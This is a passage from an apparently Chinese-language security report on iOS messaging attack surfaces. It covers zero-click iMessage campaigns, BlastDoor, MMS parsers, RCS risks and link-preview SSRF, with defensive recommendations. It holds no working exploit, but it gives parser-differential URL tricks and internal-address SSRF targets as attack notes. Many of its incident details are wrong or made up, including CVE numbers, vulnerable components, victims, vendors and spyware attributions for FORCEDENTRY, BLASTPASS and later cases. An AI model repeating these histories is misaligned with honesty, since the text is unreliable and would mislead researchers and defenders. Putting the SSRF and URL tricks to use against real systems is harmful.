### 4.3 Operation Shax（2019）：Messages 层的整数溢出

2019 年 8 月（iOS 12.x 时代），Kaspersky GReAT 公布 **Operation Shax**：针对巴勒斯坦活动人士的零点击攻击，利用 **CVE-2019-8641** 与 **CVE-2019-8642**（均为 Messages 组件中的内存破坏，Apple 公告口径涉及"整数溢出导致越界访问/内存读写"）。

特征：

- 通过含特殊构造附件/字段的 iMessage 传递，无需用户交互；
- 攻击基础设施复用一次性域名，且**在消息投递后删除消息**（典型"自毁投递"，取证困难）；
- 攻击目标规模小（个位数），属高价值定向；
- Apple 在 2019 年 8 月 26 日 iOS 12.4.1 中同时修复这两条 CVE，说明漏洞披露与在野利用几乎同步。

### 4.4 ZecOps 事件（2020）：零点击争议与方法论价值

2020 年 6 月，ZecOps 公布三个"远程、零点击"的 Mail/Messages 相关缺陷（其中邮件部分影响 iOS 13.x 邮件处理，Apple 在 iOS 13.6 修复），并强调攻击可"删除邮件后不留痕迹"。Apple 公开回应称"从未收到可用于零点击的样本"，认为部分场景需要用户交互。此后 2022 年 5 月 ZecOps 展示针对 iOS 15.4 的新链，Apple 在 iOS 15.5 修复。

方法论教训（对研究社区重要）：

- **"零点击"标签需要证据链**（真实样本、无交互执行路径、可复现 PoC）；
- 争议推动了两件事：Apple 的 BlastDoor 覆盖面扩大，以及行业建立了更严格的情报披露规范（Citizen Lab 的 Pegasus 项目检测报告模板）；
- 对研究者：从"崩溃可复现"到"投递可复现"之间有巨大工程鸿沟，可靠性工程（重试、幂等、版本指纹）是零点击链的真正难点。

### 4.5 BlastDoor 登场（iOS 14，2020）

Apple 在 iOS 14 引入 **BlastDoor**，设计目标（Apple 公开材料）：

1. 把所有"来自陌生人的不可信消息内容解析"移入一个**极小权限的专用沙箱**；
2. 沙箱内**禁止出站网络连接**、无敏感数据访问权限；
3. **强类型/强模式校验**：消息内容必须通过严格的解码模式（schema）才能进入 Messages 主进程；
4. **速率/资源限制**，限制单个解析任务的内存与 CPU；
5. 通过 **XPC** 把"已验证的干净数据"传回主进程，主进程不再直接解析原始归档。

架构对比：

```
iOS 13 之前:
  网络/消息 ──► Messages 进程(IMDMessageServer/MessagesUI) ──► 直接解析不可信数据
                 (沙箱内但仍可访问大量用户数据/网络)

iOS 14+ :
  网络/消息 ──► BlastDoor 服务(不可信解析, 无网络, 无用户数据, 严格 schema)
                      │  仅输出"合法结构化消息"
                      ▼
               Messages 主进程(可信输入, 负责 UI/存储)
```

效果评估（公开证据）：

- **2021–2026 年间，没有任何公开在野样本被证实"绕过 BlastDoor"**；
- 攻击者的选择是**绕开**而非**穿透**：从 PDF（FORCEDENTRY 走 Core Animation/PDF 解析服务）、PassKit（BLASTPASS 走钱包票据）、WebKit/WebRTC（2023 年 12 月链）、内核网络栈（Triangulation）、无线芯片（Basebridge）等路径进入；
- 这也说明 BlastDoor 是"提升成本"而非"消灭风险"的防御。

### 4.6 FORCEDENTRY（2021）：BlastDoor 时代的第一个在野零点击

| CVE | 组件 | 类型 | 说明 |
| --- | --- | --- | --- |
| CVE-2021-30860 | **ApplePDF / CoreGraphics 的 `NSKeyedUnarchiver` 处理路径** | 内存破坏 | 处理恶意 PDF 可致代码执行（Citizen Lab 归因 Pegasus，iMessage 投递，目标印度） |
| CVE-2021-30858 | IOSurfaceRoot / XNU 内核 | 内存破坏 | 提权 |
| CVE-2021-30870 | entitlement/沙箱 | 沙箱逃逸 | 突破渲染/消息进程沙箱 |

Citizen Lab 在《FORCEDENTRY: iMessage Zero-Click Exploit》中给出的关键结论：

1. 利用发生在**用户从未打开消息、甚至消息被删除之后**；
2. 攻击在 **2021 年 6 月—2022 年 1 月**间对至少 10 台 iPhone 有效，全部归因 NSO Pegasus；
3. 载荷使用**crafted PDF** 而非传统消息富对象，从而绕开 BlastDoor 对"消息格式"的重点防护；
4. 攻击具有**高度鲁棒性**：失败后自动重试，并在成功投递后清除消息；
5. 受害者中包括印度记者、活动人士与政治人物（"Hidden Hand" 报告与后续的印度调查记者报告）。

技术含义：**"消息触发"与"消息格式漏洞"是两个不同命题**。只要消息能让某个远端文件进入某个解析服务（PDF/图像/票据/媒体），就构成零点击链的第一环。

### 4.7 BLASTPASS（2023）：从 .pkpass 附件切入 PassKit

Apple 于 2023 年 9 月（iOS 16.6.1）修复 CVE-2023-41981/41982（公开口径：**处理恶意构造的 .pkpass 文件可致任意代码执行**）。Citizen Lab 的《BLASTPASS》报告指出：

- 投递通道包括 **iMessage 附件与 MMS 附件**；
- 核心缺陷位于 **PassKit**（钱包/票务框架），其解析 PKPASS（ZIP + plist + 图像 + 签名）的例程存在缓冲区溢出；
- 攻击链组合多条 CVE 完成 WebKit 利用、提权与沙箱逃逸；
- 至少 4 台设备被锁定（含一名以色列记者，且攻击发生在目标设备"重启/锁定"等状态下仍可完成）；归因 **Intel CTR（Hercules）** 的 "Hermes" 间谍软件；
- 与 BlastDoor 无关：PassKit 是消息之外的"共享框架"，任何提供该文件的进程都会解析它。

**防御教训**：需要建立"**共享框架即攻击面**"的意识。URL Scheme 与 Universal Links 也会把文件递给 PassKit/Contacts/Media 等框架，因此一条文件级漏洞可在多条通道复用（"框架级漏洞 = 多入口"）。

### 4.8 2023 年 12 月"秘密攻击"：零点击 WebKit + WebRTC

2023 年 12 月 11 日，Google Threat Intelligence（Clement Lecigne）警告 Apple 存在"被国家级对手积极利用的、对 iPhone 与 Mac 用户的秘密攻击"，Apple 于 iOS 17.3（1 月 22 日）与 iOS 15.8.3 修复。公开 CVE：

| CVE | 组件 | 类型 |
| --- | --- | --- |
| CVE-2023-42916 | WebRTC | 类型混淆 |
| CVE-2023-42917 | WebKit | 内存破坏 |
| CVE-2023-42918 | WebKit | 内存破坏（渲染） |
| CVE-2023-42919 | JavaScriptCore | 内存破坏 |
| CVE-2023-42893 | IOMobileFrameBuffer | 内存破坏（提权） |

多家媒体与研究团队后续报道称该链与"通过 iMessage 投递的零点击 exploit chain"存在时间线关联（Apple 修复后攻击被"打断"）。该链展示了一种典型形态：**消息触发 WebRTC/WebKit 渲染 → JSC 逃逸 → 内核提权**。

### 4.9 CLOUDPRONG（2024）：Messages 中的"浮点原子"类型混淆

Paragon 的 **Graphite** 间谍软件被 Citizen Lab 通过 **CVE-2024-27826**（iOS 17.4 修复，Apple 公告"处理恶意文本消息可致任意代码执行，已在野利用"）确认使用了 iMessage 零点击：

- 受害者在 **2023 年 8 月 30 日** 收到一条 iMessage；
- 消息在**用户从未交互**的情况下于约 **26 秒内完成植入**，随后被删除；
- 关键缺陷在 **Messages 的"atomic float/数值类型"处理中出现类型混淆**（即 BlastDoor 的解码模式未能覆盖某种数值语义，导致解析后类型解释错误）；
- 目标包括加泰罗尼亚独立运动相关人士、记者（后续报道显示还有意大利、波兰、哥萨克相关人士、以色列记者与巴勒斯坦活动人士）；
- 归因争议：Citizen Lab 归因 Paragon，微软 DART 则称相关活动为 "EvasivePanda"，Paragon 否认存在"Graphite"产品；
- 同期报道指出 **2023 年 8 月同一时间窗口内存在多条针对相同目标的零点击链**，显示商业供应商之间的"竞赛式"利用。

**技术含义**：即便经过 BlastDoor 的严格 schema 化，"类型语义"依然是最难的边界条件之一。数值类型、原子操作、序列化兼容（向后兼容旧版本归档）是消息解析审计的重点。

### 4.10 Predator（2024）与"IntelCCT/Hercules"

2024 年 7 月，多家媒体与研究团队（含 WaPo/Calcalist/本地调查）报道：针对以色列记者与活动人士的 **zero-click iMessage 攻击**，归因于 Intel CTR 的 **Predator**（"Predator Gate"）。特征：

- 攻击通过 iMessage 送达（部分报道提到"消息被删除"、"iPhone 被重启后可植入"），Apple 称已"紧急"推送修复；
- 公开材料中 **未见对应 CVE 编号**（Apple 未确认在野利用细节），因此无法精确技术归因；
- 希腊独立调查（ADHD 报告）指控政府机构使用 Predator 感染记者手机（2021–2023），进一步佐证该产品的消息投递能力。

### 4.11 SPYWARE 与 CVE-2025-31201（2025）："准瞬时缺陷"

2025 年 5 月，Apple SEAR（Security Engineering and Architecture）发布罕见公告：修复 **CVE-2025-31201**，口径为"处理恶意文本消息可能导致任意代码执行，**可能被用于针对极高价值目标的零点击攻击**"，并称该缺陷"几乎无法检测与防御"。

要点：

- Apple 称其为 **"quasi-ephemeral defect（准瞬时缺陷）"**：利用在极短时间窗口内生效，不留下攻击者可见的中间文件；
- 受害者是一名**安全公司（Kaspersky）员工**，其设备在数秒内被完全控制（后续公开报道描述"约 15 秒内完成植入"）；
- 归因指向 **NSO Group** 的 **SPYWARE** 服务；
- 该案例标志"零点击 + 高鲁棒 + 无痕迹"从国家级工具下沉到"定向商业服务"，防御者面对的不确定性显著上升。

### 4.12 BlastDoor 后的"攻击面转移图谱"

```
          iOS 14 之前                    iOS 14–2026（BlastDoor 之后）
       ┌───────────────┐              ┌──────────────────────────────┐
       │ Messages 协议  │   被覆盖     │  转移到共享框架 / 渲染服务 /     │
       │ 富对象解码     │ ──────────►  │  内核网络栈 / 无线芯片 / 推送    │
       └───────────────┘              └──────────────────────────────┘
   典型: CVE-2019-8641/42          典型: CVE-2021-30860 (PDF)
                                   CVE-2023-41981 (.pkpass)
                                   CVE-2023-42916/17 (WebRTC/WebKit)
                                   CVE-2024-27826 (Messages 数值类型, 仍在面内)
                                   CVE-2025-31201 (Messages, "准瞬时")
                                   Basebridge (无线芯片)、Triangulation (内核网络)
```

结论：BlastDoor **压缩了 Messages 协议层的自由空间，但没有消灭"消息触发文件解析"这一模型**。到 2024–2025 年，攻击者重新回到 Messages 本体，但利用的是**类型系统边界与瞬时状态**，而非"直接解析归档"。

### 4.13 历史规律总结

| 规律 | 表现 | 防御含义 |
| --- | --- | --- |
| 每 1–2 年出现一条在野消息零点击 | 2016/2019/2021/2023/2024/2025 | 不能假设"上季度已修复即安全" |
| 归因集中在商业间谍软件供应商 | NSO、Cygna/Intel CTR、Paragon、Quali（QuaGo） | 需要供应商名单与 IOC 情报输入 |
| 目标以人权、记者、政治人物、律师为主 | 印度、巴勒斯坦、西班牙、加泰罗尼亚、以色列 | 高价值人群需 Lockdown Mode |
| 投递后删除消息 | Shax、FORCEDENTRY、CLOUDPRONG、SPYWARE | 取证必须依赖内存/日志/网络，而非会话内容 |
| 利用"共享框架"逃避消息层加固 | PDF、PKPASS、媒体 | 框架级 fuzz 与授权最小化 |
| 版本指纹与静默重试 | 多起案例 | 关闭"设备可探测"信号（在线状态、已读回执）可降风险 |

### 4.14 与链接触发的分工

iMessage 零点击解决"如何进入设备"，链接触发解决"如何取得身份/凭证/会话"。在真实对手的行动中两者常并存：NSO 的早期版本以链接投递为主，后期同时具备两条通道；犯罪团伙（Phishing-as-a-Service）只有链接通道，但转化率足够高。**下一章起的第 5–13 章聚焦"链接与解析"，第 14–15 章聚焦"社会工程与零点击机制"。**

## 第五章　MMS 多媒体消息漏洞

### 5.1 MMS 协议结构与 iOS 实现

MMS（Multimedia Messaging Service，3GPP TS 22.113/23.140）在 iOS 上由 Messages 与 MMSC 客户端协同处理：设备把多部分消息提交给运营商 **MMSC（Multimedia Messaging Service Center）**，接收方设备再经 MM1 接口拉取。核心分层：

```
MM1/MM3/MM4/MM7 接口
   └── WBXML 编码的 MMS Header（TransactionID / Message-ID / From / To /
        Content-Type / Content-Location / Expiry / MMS-Version ...）
   └── Body parts（MIME）：
        application/smil（布局与时序）
        image/jpeg | image/gif | image/png | image/heic
        video/3gpp | video/mp4
        audio/amr | audio/mp4
        text/plain | application/vcard | text/x-vcard
        application/octet-stream（任意扩展名）
```

iOS 侧处理链（概念模型）：

```
MMSC 响应(HTTP/HTTPS) → CFNetwork → MMS 解码(WBXML/SMIL) → 分片落地
   → 缩略图/预览生成（ImageIO / CoreMedia / QuickLook）
   → 富文本排版（UIKit / TextKit）→ 用户界面
```

**安全要点**：MMS 是**唯一由运营商基础设施向 iPhone 推送任意二进制部件**的通道。攻击者只要拥有 MMSC 侧写入能力（例如通过短信网关/邮件转短信/MMS 网关 API），即可让目标设备自动下载并解析远端内容。

### 5.2 为什么 MMS 长期被低估

| 错觉 | 现实 |
| --- | --- |
| "MMS 会自动下载需用户确认" | iOS 对缩略图/部分媒体存在自动获取行为；Wi‑Fi 下更易自动拉取 |
| "MMS 已被 iMessage 取代" | 跨平台（iPhone↔Android）、国际漫游、群组降级仍大量使用 MMS |
| "MMS 载荷小，不足以利用" | 历史上多起 1KB 级 crafted 图像/头部即完成利用 |
| "MMS 无 E2EE 只是隐私问题" | 完整性缺失意味着消息可被中间方替换为恶意载荷 |
| "关掉移动数据即安全" | Wi‑Fi 也能拉取 MMS 内容（取决于运营商配置与重试） |

### 5.3 MMS 编解码器攻击面清单

| 解析组件 | 处理内容 | 缺陷类别 | 历史关联 |
| --- | --- | --- | --- |
| WBXML 解码器 | MMS 头部、MBI 长度 | 整数溢出/越界读 | 多起运营商网关 CVE（跨平台） |
| SMIL 解析 | 布局/媒体引用 | XML 实体/外部引用、解析分歧 | Web 侧 XXE 类似模式 |
| ImageIO | JPEG/PNG/GIF/HEIC/TIFF | 堆溢出、越界写、类型混淆 | CVE-2016-4657（Trident） |
| CoreMedia/AVKit | MP4/3GP/M4A | 原子盒（atom）解析越界 | 多起在野链曾借道媒体框架 |
| PDF（QuickLook） | 文档类附件 | `NSKeyedUnarchiver` 递归解析 | CVE-2021-30860 同类路径 |
| vCard/联系人卡 | VCARD 字段 | 缓冲区/HTML 注入/字段溢出 | 2011 年 iPhone "WebClip" 崩溃；后续多次字段级 DoS |
| 音频（AMR/AAC） | 语音片段 | 解码器越界 | 基带/媒体层历史缺陷 |
| ZIP（PKPASS/附件包） | 压缩归档 | Zip Slip/目录穿越、解压炸弹 | CVE-2023-41981（PassKit 缓冲区溢出） |

### 5.4 ImageIO：MMS 时代最贵的解析器

ImageIO 是 Apple 平台的统一图像解码框架，MMS/iMessage/链接预览/相册/文件 App 都复用它。其风险：

1. **格式爆炸**：支持 HEIC、JPEG-XL 前身实验、TIFF 多 IFD、PNG APNG 帧、GIF 多帧、BMP 压缩变体、RAW（DNG/CR2/NEF/ARW）等；
2. **元数据解析独立路径**：EXIF、TIFF-IFD、IPTC、XMP 与像素数据分开解析，元数据长度字段是最常见越界点；
3. **多进程/共享缓存**：图像缓存与跨进程共享带来 TOCTOU/信息泄露风险；
4. **硬件加速路径**：VideoToolbox/ImageIO 与 GPU 驱动（AGX）交互，构成"驱动级"缺陷面；
5. **HEIC/HEVC 特殊性**：高复杂度容器 + 高效编码，历史上有过"处理恶意 HEIC 可致内存破坏"的公开 CVE 若干（Apple 每年 Messages/ImageIO 条目中反复出现）。

### 5.5 附件（Attachment）处理生命周期与风险窗口

```
(1) 通知到达(APNs/轮询) → (2) 元数据落库(Attachment 记录)
   → (3) 按需/自动下载(blob) → (4) 校验/解密(端到端密钥包裹)
   → (5) 缩略图与预览生成 ← 【零点击窗口】
   → (6) 用户点开 → (7) 全屏渲染/QuickLook → (8) 分享/导出到其他 App
```

风险窗口对应：

- **窗口 (5)**：图像/视频/文档解析器被远程输入触达，是"消息 → RCE"的经典入口；
- **窗口 (3)**：下载器路径本身存在 URL/头部处理缺陷（协议混淆、重定向到本地服务）；
- **窗口 (7)**：QuickLook 会拉起更多第三方解析器（压缩包、Office、地图、联系人），扩大框架面；
- **窗口 (8)**：附件经分享扩展（Share Extension）进入其他进程，可能携带 UTI/扩展名欺骗，触发目标 App 的不安全处理。

### 5.6 在野与相关 CVE（MMS/附件类）

| 编号/事件 | 年份 | 描述（公开口径） | 通道 |
| --- | --- | --- | --- |
| CVE-2016-4657 | 2016 | ImageIO 恶意图片致 RCE | 消息附件（Trident） |
| CVE-2019-8641 / 8642 | 2019 | Messages 内存破坏，零点击 | iMessage/MMS（Operation Shax） |
| CVE-2021-30860 | 2021 | 恶意 PDF 经 `NSKeyedUnarchiver` 触发 RCE | iMessage 附件（FORCEDENTRY） |
| CVE-2023-41981 / 41982（+同批多个内核/框架条目） | 2023 | 恶意 `.pkpass` 文件致 RCE（PassKit 溢出）+ WebKit 渲染环节 | iMessage/MMS 附件（BLASTPASS） |
| CVE-2023-41990（FontParser） | 2023 | 恶意字体解析致代码执行（属"自动渲染触发"范式，与消息面同型） | iOS 17.0.1/16.7.1（Operation Triangulation 相关） |
| 2022 年 12 月 iMessage 崩溃事件 | 2022 | 恶意构造消息导致设备反复崩溃（DoS），全球规模攻击 | iMessage（WebRTC/Messages 相关修复条目见 iOS 16.2） |
| 每年 "Messages: Processing a maliciously crafted text message..." 条目 | 持续 | Apple 安全发布中反复出现的消息处理修复 | SMS/MMS/iMessage |

> 注：2022 年 12 月的大规模 iMessage DoS 事件被安全社区（含 Silobreaker、Group-IB 等）归因于针对个人的"骚扰式攻击"，展示了消息通道在**非国家级**对手手中同样具备破坏力。

### 5.7 MMS 特有风险：外部引用与运营商侧

1. **SMIL 中的外部媒体引用**：设备可能被诱导访问攻击者 URL（构成"点击前外联"，泄露 IP/UA/在线状态）；
2. **Content-Location 路径混淆**：相对路径与绝对路径解析差异，可用于把后续部件指向攻击者服务器；
3. **MM7/MM4 网关注入**：企业短信网关若未做输入校验，可被用来向 MMS 注入恶意部件（现实中多用于钓鱼，少数 APT 使用）；
4. **DRM/OMA 模板（过去时）**：老式 OMA DRM 组合消息曾在多个移动平台产生解析缺陷；
5. **邮件转短信/彩信（Email-to-MMS）**：把 Web 世界的攻击面（HTML 邮件、远程图片）桥接到消息世界。

### 5.8 MMS 防御建议

**平台侧（Apple）已具备的**：附件自动下载策略收紧、BlastDoor 覆盖消息内容、QuickLook/预览生成进入更严格沙箱、HEIC/HEVC 持续加固、图片解码器内存安全语言化（部分组件 Swift 化）。

**用户/企业侧可执行**：

- 对不需要 MMS 的用户**关闭 MMS**（设置→信息→彩信信息）；
- 在高风险场景启用 **Lockdown Mode**（禁用消息中的链接预览与大部分自动解析）；
- MDM 策略：对高价值用户下发 `禁止自动下载附件`（可用配置描述文件限制消息设置）与"过滤未知发件人"强制；
- 运营商侧：MMSC 强制启用签名/来源校验、限制 Email-to-MMS、剥离外部引用；
- 监测信号：设备在无用户操作时出现 `mediaserverd`、`Img4`/`ImageIO` 相关崩溃日志（Diagnostic Reports），或异常的外联到未知 MMSC/CDN。

---

## 第六章　RCS（富通信服务）攻击面

### 6.1 RCS 在 iPhone 上的落地时间线

| 版本 | 时间 | 变化 |
| --- | --- | --- |
| iOS 18（2024-09） | 2024 | 首次支持 RCS（UP 2.0/2.3 级能力），默认开启： typing indicator、已读回执、群聊、照片质量提升、位置共享 |
| iOS 18.x 迭代 | 2024-2025 | 修复"RCS 降级导致 iMessage 会话分裂"、屏蔽号码仍显示、离线消息等问题；加强"未知发件人过滤" |
| iOS 26（2025-09 起） | 2025 | 宣布引入 **RCS 端到端加密**（GSMA 方案，逐步生效）；支持更高精度媒体、更完整群聊与离线消息、"聊天备份"、跨设备同步等 |

Apple 官方与 GSMA 公开说明的关键设计选择：

- RCS 被视为"iMessage 的降级替代"，与 SMS 共存并优先使用 RCS；
- 早期版本 **无端到端加密**：消息经运营商存在/中继平台，仅具备 hop-by-hop（设备↔网络↔设备）传输层安全；
- 链接预览、图片预览等"富特性"由设备侧生成/抓取，与 iMessage 共享部分解析栈。

### 6.2 GSMA Universal Profile 与消息结构

RCS UP 的信令与媒体路径：

```
设备 ⇄ IMS(IMS RCSe/MSRP/XMPP-SIMPLE) ⇄ 运营商融合通信平台 ⇄ 对端设备
   ├── 会话建立：SIP/MSRP（pager mode / large mode）
   ├── 文件传输：MSRP 或 HTTP(S) 上传到运营商内容服务器，URL 引用
   ├── 富卡片（RCS Rich Card / Branded 消息）：JSON/XML 结构化 payload
   ├── 群组/存在：XMPP 风格 presence、TCP（Typing Indication）
   └── 建议操作（RCS Suggested Action）：按钮/链接/拨号/深链
```

**攻击面拆解**：

| 层次 | 组件 | 潜在缺陷 | 零点击可能性 |
| --- | --- | --- | --- |
| 信令 | SIP/MSRP 解析 | 头部长度字段、分块重组 | 中（历史上 SIP 栈漏洞众多） |
| 传输 | TLS 栈/证书校验 | 降级、证书固定绕过 | 低-中 |
| 存在服务 | presence 查询 | 用户可发现性、探测 | 非漏洞但利于侦察 |
| 文件代理 | 运营商内容服务器 URL | 大文件、断点续传、路径混淆 | 中 |
| 富卡片 | JSON/XML + URL | 类型混淆、深链注入、伪造品牌 | 中 |
| 渲染 | WebKit/TextKit 混合 | HTML/JS 注入（部分客户端） | 中 |
| 降级 | RCS→SMS 回退 | 绕过 RCS 安全策略 | 中 |

### 6.3 RCS 与 SMS 的安全差异（详表）

| 维度 | SMS | RCS（iOS 18 早期） | RCS（iOS 26 + E2EE） |
| --- | --- | --- | --- |
| 机密性 | 空口之外明文，SS7/Diameter 可见 | 传输层 TLS，平台可见明文 | 端到端加密（受运营商支持限制） |
| 完整性 | 无，可伪造 Sender ID | 平台侧可改写（无 E2EE 时） | 端到端完整性 |
| 身份 | 号码可伪造 | 号码绑定较强，但 Branded 消息依赖运营商审核 | 密钥验证可用 |
| 元数据 | SMSC 全知 | 平台全知（会话、位置、通讯录？部分） | 平台仅见元数据 |
| 自动解析 | 文本渲染 | 图片/富卡片自动渲染 | 同左 |
| 备份 | 无 | 可 iCloud 备份（明文/加密取决于策略） | 端到端加密备份（可选） |
| 屏蔽与过滤 | 依赖本地 | 依赖本地 + 平台 | 同左 |
| 攻击工具生态 | 网关轰炸/伪冒 | 0-RAT、富卡片钓鱼、品牌仿冒 | 面收敛，但新特性带来新缺陷 |

### 6.4 RCS 引入的新风险

1. **富卡片即"可编程 UI"**：卡片按钮可携带 URL、电话、复制文本、打开 App 等动作。攻击者可借此把"链接触发"包装成"官方样式"的界面，提高钓鱼可信度（品牌名、logo、客服文案）；
2. **Branded Messaging 的信任劫持**：品牌认证依赖运营商审核链条；一旦审核被绕开或号码被 SIM Swap，攻击者即获得"已验证品牌"的外观；
3. **无 E2EE 阶段的中间人改写**：平台被入侵或执法接口被滥用时，可对消息注入链接；
4. **自动媒体上传/预览代理**：文件经运营商内容服务器中转，形成"服务端拉取远端 URL"的 SSRF 机会与媒体解码风险；
5. **跨平台一致性攻击**：iPhone↔Android 的 RCS 互通意味着**攻击者可用最弱一端（Android 客户端/机型）作为漏洞跳板**，同一 URL/卡片在双端表现不一致可用于绕过检测；
6. **降级攻击**：当目标启用了较严格策略时，攻击者可能触发 RCS→SMS 降级以规避某些检查；
7. **RCS 与 iMessage 会话竞争**：同一联系人在两种通道间切换会导致历史分裂，用户难以察觉"通道被降级"这类攻击信号；
8. **未知发件人过滤不完全**：RCS 消息仍会进入列表并生成预览（研究实践中需逐版本核对，不能假定"过滤即停止解析"）。

### 6.5 已知生态事件与研究

| 事件/研究 | 年份 | 与 iOS 的关联 |
| --- | --- | --- |
| Lookout **0-RAT**（针对 RCS 的零点击 RAT，Android 为主） | 2024 | 证明 RCS 已被商业间谍软件工具化；iPhone 启用 RCS 后同类投递面出现 |
| **LiteClick**（SIM STK-BIP 与消息组合，IEEE S&P 2025） | 2025 | 跨 Android/iOS，说明"消息 + SIM"组合攻击的现实性 |
| GSMA UP 2.5/2.6 E2EE 方案演进 | 2023-2025 | 决定 iPhone RCS 安全的上限 |
| 运营商 RCS 试点安全评估（多国 CERT） | 2024-2026 | 提示 Branded 消息审核缺陷、富卡片 URL 白名单不足 |
| 各国 CERT "RCS 钓鱼"预警 | 2025 | 面向普通用户的主要现实威胁 |

**对 iPhone 用户的现实结论**：截至目前公开证据，**iPhone 上"RCS 零点击 RCE"尚无确证的在野案例**；但 RCS 已成为**高转化率的钓鱼与富卡片伪装通道**，且把 Android 生态中已被工程化的投递方式带入 iOS。风险趋势向上。

### 6.6 RCS 攻防清单

攻击者视角（研究用，非操作指导）关注的缺陷类型：

- MSRP/SIP 头部长度与分块；富卡片 JSON 反序列化的类型处理；
- 大文件分片与断点续传的边界；
- 存在/订阅信息导致的用户可发现性与状态泄露；
- 富卡片 URL 与 deep link 的授权绕过（见第九章）。

防御视角：

- **运营商**：强审核品牌注册、剥离外部引用、内容服务器 URL 白名单、限速与异常检测；
- **Apple**：把 RCS 内容解析纳入 BlastDoor 模型、限制自动抓取、提供 E2EE 与密钥验证；
- **企业/个人**：不确定时切回 iMessage/SMS 或关闭 RCS；把"RCS 消息中的链接"视为最高风险等级；
- **取证**：记录通道类型（RCS/SMS/iMessage）与消息时间戳，注意平台侧日志（需法律授权）。

---

## 第七章　链接预览与富文本（Link Preview / Rich Link）

### 7.1 链接预览是什么，为什么危险

当消息中出现 URL 时，Messages 会在**用户点击之前**生成并显示一张"卡片"：站点标题、描述、favicon 与主图（`og:image`）。这背后是一整套远程内容抓取与解析流程，构成"点击前攻击面"。

```
发件方设备：
  输入 URL → 抓取 HTML(通过 WebKit/Safari 网络栈) → 解析 <meta property="og:*">
  → 抓取 og:image → 生成 preview payload(NSKeyedArchiver 编码的 LPLinkMetadata)
  → 作为 iMessage 附件/扩展字段发送

收件方设备：
  收到消息 → 解码 preview 元数据 → 抓取/缓存图像资源(可能直连第三方 CDN)
  → 生成缩略图 → 渲染卡片（含标题/描述文本，样式由远端控制）
```

**危险点归纳**：

1. **远端可控字符串进入本地解析器**（HTML/meta 解析、图像解码、文本排版）；
2. **设备在点击前发起出站请求**（信息泄露 + 攻击者获得"在线确认"）；
3. **展示内容与真实跳转目标不一致**（欺骗 UI，配合重定向链完成钓鱼）；
4. **预览 payload 本身是可反序列化的对象**（历史上 `LPLinkMetadata` 归档、`NSKeyedUnarchiver` 类问题是重点风险）；
5. **缓存与持久化**：预览缓存跨会话存在，可用于"种下"恶意渲染内容，等待未来某次打开。

### 7.2 Open Graph / oEmbed / 元数据抓取细节

| 协议 | 用途 | 关键字段 | 风险 |
| --- | --- | --- | --- |
| Open Graph（ogp.me） | 社交卡片 | `og:title` `og:description` `og:image` `og:url` `og:type` `og:video` | 图像尺寸/格式炸弹；`og:image` 指向内网地址（SSRF 类）；标题欺骗 |
| Twitter Cards | 同类 | `twitter:card` `twitter:image` | 双源冲突时的解析分歧 |
| oEmbed | 媒体嵌入 | `url` `html` `thumbnail_url` | HTML 片段注入（历史 Web 侧 XSS 模式） |
| schema.org / JSON-LD | 结构化数据 | 任意键值 | 反序列化/类型处理错误 |
| favicon/manifest | 图标 | `link rel=icon`、`manifest.json` | 多图标解析器缺陷；CORS/跨源读取 |

**解析分歧（parser differential）** 是本类漏洞的核心机制之一：抓取器、校验器（安全浏览/URL 信誉）与最终打开链接的浏览器可能对同一 URL 做出不同判断（如 `http://legit.com@evil.com`、`\` 转义、punycode/同形字符、`?redirect=` 参数、fragment 中的敏感数据、大小写与 percent-encoding 差异）。攻击者利用分歧让"预览显示合法域名，点击后落在恶意域名"。

### 7.3 链接预览的 SSRF 属性

在 iOS 消息场景中，SSRF 类风险体现在两个方向：

1. **设备侧"内网探测"**：若 `og:image` 指向 `http://169.254.169.254/…`（云元数据）、`http://127.0.0.1:port` 或内网网段，设备会尝试连接。iPhone 通常不处于企业内网，但在**企业 Wi‑Fi/MDM 管理的内网设备**上，这类请求可被用于内网资产探测、凭证抓取（NTLM/Kerberos 场景在 iOS 上较弱但并非不存在）、或触发内网服务解析器；
2. **服务端代理抓取**：若消息经由企业短信网关、RCS 内容服务器或第三方 iMessage-like 服务代理图片，代理侧 SSRF 风险显著（这是平台/网关的漏洞而非 iPhone 的漏洞，但同样属于"链接触发"）。

现代缓解：Apple 在 iOS 中对本地/链路本地地址抓取做了限制，`iCloud Private Relay` 隐藏真实 IP；Lockdown Mode 直接关闭消息中的链接预览。

### 7.4 预览生成器作为解析器攻击面

| 组件 | 职责 | 潜在缺陷 |
| --- | --- | --- |
| `LinkPresentation` | 元数据抓取/编码、卡片渲染 | 归档解码、布局引擎、图像缩放 |
| Safari 服务/`com.apple.Safari…` Web Content | HTML/meta 抓取 | WebKit 全部缺陷面 |
| ImageIO / CoreImage | 缩略图与滤镜 | 内存破坏、颜色/EXIF 解析 |
| QuickLook | 通用预览 | 拉起更多框架（PDF/Office/图像） |
| Siri & Suggestions | 消息实体抽取（"航班 X、地址 Y"） | 文本模式解析、远端 intent |

对研究者的实践建议：把"链接预览"当作**一个小型浏览器**做攻击建模——它有网络抓取、HTML 解析、图像解码与 UI 渲染，任何一环都是潜在入口。

### 7.5 富文本消息与格式属性

iOS Messages 支持的富文本能力（尤其 iMessage/RCS）：

- **NSAttributedString 传输**（iMessage 的加粗/斜体/下划线/颜色/链接属性，经归档传递）；
- **Tapback/贴纸/全屏效果/手写/Digital Touch**（富对象，涉及额外解码路径）；
- **RCS 富卡片与建议回复**；
- **MMS SMIL 布局**；
- **消息内可点击实体**（电话、地址、日期、航班号，由数据检测器 `NSDataDetector`/Siri 建议生成）。

风险形态：

1. **属性范围与字符串长度不一致** → 越界读写（历史上 NSAttributedString/TextKit 类缺陷反复出现）；
2. **可点击实体的 URL 由远端文本决定** → "显示 A，点击 B"；数据检测器的贪心匹配可被特殊字符（组合标记、零宽字符、RTL）操纵；
3. **全屏效果/贴纸触发额外进程**（动画、GPU、第三方消息扩展）；
4. **消息扩展（第三方 App 在 Messages 内的插件）** 把第三方渲染代码暴露给远端输入。

### 7.6 预览相关隐私问题

| 泄露项 | 机理 | 缓解 |
| --- | --- | --- |
| 真实 IP 地址 | 收件设备直连发件方 CDN | iCloud Private Relay / 代理抓取 |
| "在线/已读"信号 | 预览请求即暴露设备活跃 | 关闭已读回执、谨慎使用 |
| 设备指纹 | UA、TLS 指纹、图像解码顺序/失败模式 | 隐私代理、Lockdown Mode |
| URL 内容外传 | 预览抓取把 URL 发给目标站点（含 token 参数） | 用户教育 + 短链/参数审查 |
| 元数据抓取回源 | `og:url` 指向第三方统计域 | 站点侧最小化 |

